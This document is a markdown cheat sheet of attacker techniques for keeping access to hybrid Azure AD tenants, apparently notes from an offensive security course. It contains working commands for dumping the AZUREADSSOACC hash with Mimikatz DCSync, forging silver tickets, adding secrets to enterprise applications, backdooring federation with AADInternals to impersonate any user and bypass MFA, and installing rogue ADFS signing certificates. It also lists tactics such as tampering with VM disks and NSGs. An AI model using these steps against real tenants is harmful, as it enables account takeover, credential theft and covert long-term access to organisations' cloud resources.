# Persistence
- It is recommended by Microsoft to join the Azure AD Connect server to the on-prem AD. 
- This means that the persistence mechanisms for on-prem (like Golden Ticket, Silver Ticket, ACL Backdoors and others) that provide us either DA on the on-prem or local admin on the Azure AD connect server will allow to get GA on Azure AD on demand!
  - For PHS, we can extract the credentials
  - For PTA, we can install the agent
  - For Federation, we can extract the certificate from ADFS server using DA

## Hybrid identity - Seamless SSO
- Seamless SSO is supported by both PHS and PTA.
- If seamless SSO is enabled, a computer account AZUREADSSOC is created in the on-prem AD.
- Password/key of the AZUREADSSOACC never changes.

#### Get NTLM hash of AZUREADSSOC account
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\azureadssoacc$ /domain:<DOMAIN> /dc:<DC NAME>"'
```

#### Create a silver ticket
```
Invoke-Mimikatz -Command '"kerberos::golden /user:<USERNAME> /sid:<SID> /id:1108 /domain:<DOMAIN> /rc4:<HASH> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"' 
```

## Add credentials to enterprise applications
#### Check if secrets (application passwords) can be added to all enterprise applications
```
. .\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

#### Use the secret to autheticate as service principal.
```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

### Check what resources service principal can access
```
Get-AzResource
```

## Federation
### Creating a trusted domain
If we have GA privileges on a tenant, we can add a new domain (must be verified), configure its authentication type to Federated and configure the domain to trust a specific certificate (any.sts in the below command) and issuer.

#### Add a domain with AADInternal
```
Import-Module .\AADInternals.psd1
ConvertTo-AADIntBackdoor -DomainName <DOMAIN>
```

#### Get immutableID of the user that we want to impersonate. Using Msol module
```
Get-MsolUser | select userPrincipalName,ImmutableID
```

#### Access any cloud app as the user
```
Open-AADIntOffice365Portal -ImmutableID <ID> -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA $true
```

### Token Signing Certificate
- With DA privileges on on-prem AD, it is possible to create and import new Token signing and Token Decrypt certificates that have a very long validity. 

#### Create new certs, add them to ADFS, Disable auto reollver and restart the service
```
Import-Module .\AADInternals.psd1
New-AADIntADFSSelfSignedCertificates
```

#### Update the certificate information with AzureAD
```
Update-AADIntADFSFederationSettings -Domain <DOMAIN>
```

## Storage account access keys
- We already know that keys provide root equivalent privileges on an storage account. 
- There are two access keys and they are NOT rotated automatically (unless a key vault is managing the keys). 
- This, of course, provides neat persistent access to the storage account.
- We can also generate SAS URL (including offline minting) using the access keys. 


## Application and service principals
- With privileges of Application Administrator, GA or a custom role with microsoft.directory/applications/credentials/update permissions, we can add credentials (secret or certificate) to an existing application.
- We can also add a new application that has high permissions and then use that for persistence.
- If we have GA privileges, we can create an application with the Privileged authentication administrator role - that allows to reset password of Global Administrators.

#### Sign in as a service principal account
```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<ACCOUNT ID>", $passwd) 
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant <ID>
```

#### For certificate based authentication
```
Connect-AzAccount -ServicePrincipal -Tenant <ID> -
CertificateThumbprint <Thumbprint> -ApplicationId <ID>
```

## Illicit Consent Grant
- We can register an application (only for the target tenant) that needs high impact permissions with admin consent - like sending mail on a user's behalf, role management etc.

## Azure VMs and NSGs
- OS level persistence on an Azure VM where we have remote access is very useful. 
- Azure VMs also support managed identity so persistence on any such VM will allow us access to additional Azure resources. 
- We can also create snapshot of disk attached to a running VM. This can be used to extract secrets stored on disk (like SAM hive for Windows). 
- It is also possible to attach a modified/tampered disk to a turned-off VM. For example, add a local administrator!
- Couple this with modification of NSGs to allow access from IPs that we control!

## Custom Azure AD roles
- If we have GA in a tenant, we can modify a custom role and assign that to a user that we control. 
- Take a look at the permissions of the built-in administrative roles, we can pick individual actions. It is always helpful to go for minimal privileges.

## Deployment Modification
-  If we have persistent access to external resources like GitHub repos that are a part of deployment chain, it will be possible to persist in the target tenant. 
